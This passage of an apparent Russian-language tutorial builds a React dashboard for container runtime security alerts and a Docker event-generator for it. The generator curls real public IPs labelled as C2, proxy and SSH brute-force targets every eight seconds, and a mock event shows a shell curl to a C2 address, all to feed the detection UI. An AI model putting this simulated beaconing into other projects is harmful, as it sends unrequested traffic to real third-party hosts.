                  type="checkbox"
                  defaultChecked
                  className="accent-blue-500"
                />
                {label}
              </label>
            </li>
          ))}
        </ul>
      </section>

      {/* Легенда графа */}
      <section>
        <h3 className="mb-2 text-xs font-semibold uppercase text-slate-500">
          Легенда
        </h3>
        <ul className="space-y-1 text-xs text-slate-400">
          <li className="flex items-center gap-2">
            <span className="h-3 w-3 rounded-full bg-blue-400" /> Контейнер
          </li>
          <li className="flex items-center gap-2">
            <span className="h-3 w-3 rounded-full bg-slate-400" /> Процесс
          </li>
          <li className="flex items-center gap-2">
            <span className="h-3 w-3 rounded-full bg-red-500" /> Сетевой узел
            (C2)
          </li>
        </ul>
      </section>
    </div>
  );
};
```

> 🔧 В реальном проекте `defaultChecked` в типе событий нужно тоже вынести в store (`typeFilter`), чтобы фильтр работал. Оставил за скобками, чтобы не раздувать код — по аналогии с `severityFilter`.

---

# Часть C. `DetailsPanel` детально

`src/components/panels/DetailsPanel.tsx`

```tsx
import { useAppStore } from '../../store/useAppStore';
import { mockEvents } from '../../data/mockEvents';
import { initialNodes } from '../../data/mockGraph';
import { format } from 'date-fns';
import { X, Copy, AlertTriangle } from 'lucide-react';
import { useState } from 'react';

export const DetailsPanel = () => {
  const { selectedEventId, selectedNodeId, clearHighlight } = useAppStore();
  const [copied, setCopied] = useState(false);

  const event = mockEvents.find((e) => e.id === selectedEventId);
  const node = initialNodes.find((n) => n.id === selectedNodeId);

  const handleCopy = async (payload: unknown) => {
    await navigator.clipboard.writeText(JSON.stringify(payload, null, 2));
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  if (!event && !node) {
    return (
      <div className="p-4 text-sm text-slate-500">
        Выберите событие в таймлайне или узел на графе, чтобы увидеть детали.
      </div>
    );
  }

  return (
    <div className="flex h-full flex-col text-slate-200">
      {/* Header */}
      <div className="flex items-center justify-between border-b border-slate-800 p-4">
        <h2 className="text-sm font-bold uppercase tracking-wide text-slate-400">
          Детали
        </h2>
        <button
          onClick={clearHighlight}
          className="rounded p-1 hover:bg-slate-800"
          aria-label="Закрыть"
        >
          <X size={16} />
        </button>
      </div>

      <div className="flex-1 overflow-y-auto p-4 text-sm">
        {/* Событие */}
        {event && (
          <section className="mb-6">
            <div className="mb-2 flex items-center gap-2">
              {event.severity === 'critical' && (
                <AlertTriangle className="text-red-500" size={16} />
              )}
              <span
                className={`rounded px-1.5 py-0.5 text-xs font-bold uppercase ${
                  event.severity === 'critical'
                    ? 'bg-red-500/20 text-red-400'
                    : event.severity === 'high'
                    ? 'bg-orange-500/20 text-orange-300'
                    : 'bg-slate-700 text-slate-300'
                }`}
              >
                {event.severity}
              </span>
              <span className="text-xs text-slate-500">
                {format(event.timestamp, 'HH:mm:ss')}
              </span>
            </div>
            <h3 className="text-base font-semibold">{event.title}</h3>
            <p className="mt-1 text-sm text-slate-400">{event.description}</p>
            <div className="mt-3 text-xs text-slate-500">
              Type: <span className="text-slate-300">{event.type}</span>
            </div>
          </section>
        )}

        {/* Узел */}
        {node && (
          <section className="mb-6">
            <h3 className="mb-2 text-xs font-semibold uppercase text-slate-500">
              Узел графа
            </h3>
            <dl className="space-y-1 text-sm">
              <div className="flex justify-between gap-2">
                <dt className="text-slate-500">ID</dt>
                <dd className="truncate font-mono text-slate-300">
                  {node.id}
                </dd>
              </div>
              <div className="flex justify-between gap-2">
                <dt className="text-slate-500">Kind</dt>
                <dd className="text-slate-300">{node.data.kind}</dd>
              </div>
              {node.data.pid !== undefined && (
                <div className="flex justify-between gap-2">
                  <dt className="text-slate-500">PID</dt>
                  <dd className="font-mono text-slate-300">{node.data.pid}</dd>
                </div>
              )}
              {node.data.ip && (
                <div className="flex justify-between gap-2">
                  <dt className="text-slate-500">IP</dt>
                  <dd className="font-mono text-slate-300">{node.data.ip}</dd>
                </div>
              )}
              {node.data.cmd && (
                <div className="mt-1">
                  <dt className="text-slate-500">Command</dt>
                  <dd className="mt-1 break-all rounded bg-slate-900 p-2 font-mono text-xs text-green-400">
                    {node.data.cmd}
                  </dd>
                </div>
              )}
            </dl>
          </section>
        )}

        {/* Raw JSON */}
        {event?.rawPayload && (
          <section>
            <div className="mb-2 flex items-center justify-between">
              <h3 className="text-xs font-semibold uppercase text-slate-500">
                Raw Event
              </h3>
              <button
                onClick={() => handleCopy(event.rawPayload)}
                className="flex items-center gap-1 rounded bg-slate-800 px-2 py-1 text-xs hover:bg-slate-700"
              >
                <Copy size={12} />
                {copied ? 'Скопировано' : 'Копировать'}
              </button>
            </div>
            <pre className="overflow-x-auto rounded bg-slate-900 p-2 font-mono text-xs text-slate-300">
              {JSON.stringify(event.rawPayload, null, 2)}
            </pre>
          </section>
        )}
      </div>
    </div>
  );
};
```

---

# Часть D. Обновлённый Timeline (с учётом фильтра)

`src/components/panels/TimelinePanel.tsx` — добавим фильтрацию по severity:

```tsx
import { mockEvents } from '../../data/mockEvents';
import { useAppStore } from '../../store/useAppStore';
import { format } from 'date-fns';
import { AlertOctagon, AlertTriangle, Info } from 'lucide-react';

const iconBySeverity = {
  critical: <AlertOctagon className="text-red-500" size={16} />,
  high: <AlertTriangle className="text-orange-400" size={16} />,
  medium: <Info className="text-yellow-400" size={16} />,
  low: <Info className="text-slate-400" size={16} />,
};

export const TimelinePanel = () => {
  const { selectedEventId, severityFilter, selectEvent } = useAppStore();

  const visibleEvents = mockEvents
    .filter((e) => severityFilter[e.severity])
    .sort((a, b) => a.timestamp - b.timestamp);

  return (
    <div className="flex h-full items-stretch gap-2 p-2">
      {visibleEvents.length === 0 && (
        <div className="flex items-center px-4 text-sm text-slate-500">
          Нет событий с выбранными фильтрами
        </div>
      )}
      {visibleEvents.map((evt) => (
        <button
          key={evt.id}
          onClick={() => selectEvent(evt)}
          className={`min-w-[240px] rounded-lg border p-3 text-left transition
            ${
              selectedEventId === evt.id
                ? 'border-blue-500 bg-slate-800 shadow-lg shadow-blue-500/20'
                : 'border-slate-700 bg-slate-900 hover:bg-slate-800'
            }`}
        >
          <div className="flex items-center gap-2 text-xs text-slate-400">
            {iconBySeverity[evt.severity]}
            <span>{format(evt.timestamp, 'HH:mm:ss')}</span>
            <span className="ml-auto uppercase">{evt.severity}</span>
          </div>
          <div className="mt-2 text-sm font-semibold text-white">
            {evt.title}
          </div>
          <div className="mt-1 line-clamp-2 text-xs text-slate-400">
            {evt.description}
          </div>
        </button>
      ))}
    </div>
  );
};
```

---

# Часть E. Добавим `rawPayload` в мок-события

Чтобы `DetailsPanel` показал Raw JSON, расширим `mockEvents.ts`:

```typescript
{
  id: 'evt-3',
  timestamp: Date.now() - 25000,
  type: 'network',
  severity: 'critical',
  title: 'Исходящее соединение на C2',
  description: 'Обращение к IP 185.220.101.5',
  sourceNodeId: 'net-evil',
  rawPayload: {
    event_type: 'network_connect',
    pid: 42,
    comm: 'sh',
    saddr: '10.0.0.14:45122',
    daddr: '185.220.101.5:443',
    proto: 'tcp',
    detected_by: 'runtime_radar_rule_2031',
  },
},
```

---

# Часть F. Проверка сценария (что должно получиться)

1. Открываешь приложение — граф с деревом: `nginx-pod → bash → sh → 185.220.101.5`.
2. Внизу — 3 карточки событий, отсортированные по времени.
3. Кликаешь **«Подозрительная команда»** (`evt-2`):
   - Все узлы вне пути **бледнеют** (`opacity: 0.25`).
   - Путь `container-1 → proc-bash → proc-sh` подсвечен, рёбра — синие с анимацией.
   - Граф **автоматически зумится** на этот путь.
   - Правая панель показывает: severity `high`, описание, PID 42, команду `sh -c "curl..."`, а также Raw JSON (если заполнен).
4. Кликаешь **«Исходящее соединение»** (`evt-3`):
   - Путь расширяется до `container-1 → proc-bash → proc-sh → net-evil`.
   - `net-evil` подсвечивается красным (он `isSuspicious`).
5. Кликаешь на пустое место графа — всё возвращается к обычному виду.
6. Снимаешь чекбокс `Critical` — событие `evt-3` пропадает из таймлайна.

---

# Запуск контейнера с активностями и добавление в проект

Чтобы получить **реальный контейнер**, который при запуске разворачивает сервис и **начинает сетевые запросы** (симулируя подозрительную активность для твоего интерфейса), мы добавим в проект отдельный **«генератор событий»**. Это будет отдельный контейнер, который живет рядом с фронтендом и раз в несколько секунд «стучится» на внешние адреса, а также пишет JSON-логи, которые фронтенд сможет читать (или имитировать чтение).

Dockerfile для фронтенда (production-сборка через Nginx) и **Dockerfile + скрипт для генератора трафика**, который и будет создавать «активность контейнера».

---

## 1. Dockerfile для фронтенда (продакшен)

Соберем React + Vite в статику и раздадим через Nginx. Это стандартный и надежный подход .

`Dockerfile` (в корне проекта):

```dockerfile
# ---------- Stage 1: Build ----------
FROM node:20-alpine AS builder

WORKDIR /app

# Сначала копируем только манифесты — для кэша слоёв
COPY package*.json ./
RUN npm ci --legacy-peer-deps

# Копируем исходники и собираем
COPY . .
RUN npm run build

# ---------- Stage 2: Serve ----------
FROM nginx:alpine

# Устанавливаем curl для healthcheck
RUN apk add --no-cache curl

# Копируем собранную статику
COPY --from=builder /app/dist /usr/share/nginx/html

# Конфиг Nginx для SPA (чтобы роутинг работал)
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 80

HEALTHCHECK --interval=10s --timeout=5s --start-period=10s --retries=3 \
  CMD curl -f http://localhost/ || exit 1

CMD ["nginx", "-g", "daemon off;"]
```

`nginx.conf` (в корне):

```nginx
server {
    listen 80;
    server_name localhost;
    root /usr/share/nginx/html;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # Прокси на API генератора событий (чтобы фронт мог читать реальные логи)
    location /api/ {
        proxy_pass http://event-generator:3001/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

> Здесь мы сразу закладываем прокси `/api/` на контейнер `event-generator`. Это позволит фронтенду делать `fetch('/api/events')` и получать реальные события из контейнера, а не только моки.

---

## 2. Генератор сетевой активности (реальный контейнер)

Создадим отдельную папку `event-generator/` с простым Node.js-сервером, который:
1. Раз в N секунд выполняет `curl` на внешние адреса (симуляция C2/подозрительных соединений).
2. Складывает результаты (время, целевой IP, статус) в память.
3. Отдает их через HTTP endpoint `/events`.

Это и есть «контейнер, который начинает запросы к сетевым службам».

### `event-generator/package.json`

```json
{
  "name": "event-generator",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "express": "^4.19.2"
  }
}
```

### `event-generator/index.js`

```javascript
import express from 'express';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);
const app = express();
const PORT = 3001;

// Хранилище событий (в памяти)
const events = [];
const MAX_EVENTS = 200;

// Список «подозрительных» целей для симуляции
const TARGETS = [
  { ip: '185.220.101.5', port: 443, label: 'C2-Server-1' },
  { ip: '45.155.205.233', port: 8080, label: 'Suspicious-Proxy' },
  { ip: '103.152.220.47', port: 22, label: 'SSH-Bruteforce-Target' },
  { ip: '8.8.8.8', port: 53, label: 'DNS-Resolver' },
];

function addEvent(event) {
  events.unshift(event);
  if (events.length > MAX_EVENTS) events.pop();
  console.log('[EVENT]', JSON.stringify(event));
}

// Генерация одного сетевого запроса
async function generateNetworkEvent() {
  const target = TARGETS[Math.floor(Math.random() * TARGETS.length)];
  const start = Date.now();

  // Используем curl (установлен в образе) для реального сетевого запроса
  const cmd = `curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 -k https://${target.ip}:${target.port} 2>/dev/null || echo "000"`;

  let httpCode = '000';
  try {
    const { stdout } = await execAsync(cmd, { timeout: 5000 });
    httpCode = stdout.trim();
  } catch {
    httpCode = '000';
  }

  const event = {
    id: `evt-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    timestamp: new Date().toISOString(),
    type: 'network',
    severity: target.label.includes('C2') ? 'critical' : 'high',
    title: `Исходящее соединение → ${target.label}`,
    description: `curl https://${target.ip}:${target.port} → HTTP ${httpCode}`,
    sourceNodeId: 'proc-sh', // привязка к узлу графа
    targetNodeId: `net-${target.ip.replace(/\./g, '-')}`,
    rawPayload: {
      event_type: 'network_connect',
      pid: 42,
      comm: 'sh',
      daddr: `${target.ip}:${target.port}`,
      http_code: httpCode,
      duration_ms: Date.now() - start,
      detected_by: 'runtime_radar_simulator',
    },
  };

  addEvent(event);
}

// Запуск цикла: каждые 8 секунд — новый запрос
setInterval(generateNetworkEvent, 8000);

// HTTP API для фронтенда
app.get('/events', (req, res) => {
  res.json(events);
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', events_count: events.length });
});

// Первое событие сразу при старте
generateNetworkEvent();

app.listen(PORT, () => {
  console.log(`Event generator running on port ${PORT}`);
});
```

### `event-generator/Dockerfile`

```dockerfile
FROM node:20-alpine

# Устанавливаем curl для выполнения сетевых запросов
RUN apk add --no-cache curl

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

EXPOSE 3001

CMD ["node", "index.js"]
```

> **Важно:** генератор использует `curl` внутри контейнера. В образе `node:20-alpine` его нет, поэтому мы явно устанавливаем `curl` через `apk` . Это делает контейнер «реальным» — он действительно отправляет сетевые пакеты наружу.

---

## 3. Docker Compose (связываем всё)

`docker-compose.yml` в корне проекта:

```yaml
version: '3.8'

services:
  # Фронтенд (React + Nginx)
  frontend:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8080:80"          # Открываем на localhost:8080
    depends_on:
      - event-generator
    networks:
      - radar-net

  # Генератор сетевых событий
  event-generator:
    build:
      context: ./event-generator
      dockerfile: Dockerfile
    ports:
      - "3001:3001"        # Для отладки можно смотреть /events напрямую
    networks:
      - radar-net

networks:
  radar-net:
    driver: bridge
```

**Что происходит при `docker-compose up --build`:**
1. Собирается фронтенд-образ (multi-stage: Vite build → Nginx).
2. Собирается образ `event-generator` (Node + curl).
3. Запускается `event-generator`, который сразу начинает `curl`-запросы на «подозрительные» IP.
4. Запускается Nginx, раздает статику на порту `8080`.
5. Запросы с фронтенда на `/api/events` проксируются в `event-generator:3001/events`.

---

## 4. Как фронтенд читает реальные события

Вместо `mockEvents` можно добавить загрузку из API. В `App.tsx` или в кастомном хуке:

```tsx
// src/hooks/useRealEvents.ts
import { useEffect, useState } from 'react';
import { SecurityEvent } from '../types';

export const useRealEvents = (intervalMs = 5000) => {
  const [events, setEvents] = useState<SecurityEvent[]>([]);

  useEffect(() => {
    const fetchEvents = async () => {
      try {
        const res = await fetch('/api/events');
        if (res.ok) {
          const data = await res.json();
          // Преобразуем формат из генератора в наш SecurityEvent
          setEvents(
            data.map((e: any) => ({
              id: e.id,
              timestamp: new Date(e.timestamp).getTime(),
              type: e.type,
              severity: e.severity,
              title: e.title,
              description: e.description,
              sourceNodeId: e.sourceNodeId,
              targetNodeId: e.targetNodeId,
              rawPayload: e.rawPayload,
            }))
          );
        }
      } catch (err) {
        console.warn('Event generator недоступен, используем моки', err);
      }
    };

    fetchEvents();
    const timer = setInterval(fetchEvents, intervalMs);
    return () => clearInterval(timer);
  }, [intervalMs]);

  return events;
};
```

Теперь `TimelinePanel` может использовать `useRealEvents()` вместо `mockEvents`. Если генератор недоступен (например, запущен только фронт без Docker), хук вернет пустой массив — можно оставить fallback на моки.

---

## 5. Проверка работоспособности

```bash
# Сборка и запуск
docker-compose up --build

# В другом терминале: проверяем, что генератор жив и шлет события
curl http://localhost:3001/events | jq

# Открываем фронтенд
open http://localhost:8080
```

**Ожидаемый результат:**
- Контейнер `event-generator` в логах (`docker-compose logs -f event-generator`) показывает `[EVENT]` каждые 8 секунд.
- Каждое событие содержит `daddr` (IP:порт), `http_code` и `duration_ms` — это **реальные сетевые запросы**, выполненные из контейнера.
- Фронтенд на `http://localhost:8080` подтягивает эти события и отображает их в таймлайне. При клике на событие срабатывает подсветка пути (из предыдущего шага).

---

## 6. Улучшения

1. **Healthcheck для генератора** — добавить в `docker-compose.yml` проверку `curl -f http://localhost:3001/health`.
2. **Ограничение сети** — если не хочешь реальных запросов наружу, замени `curl` на `ping` или используй `--connect-timeout` с заведомо недоступными IP (тогда события будут с `http_code: 000`, но факт сетевой активности зафиксируется).
3. **Логи в файл** — вместо памяти можно писать в `events.jsonl` и монтировать volume, чтобы фронтенд читал файл. Но для MVP памяти достаточно.

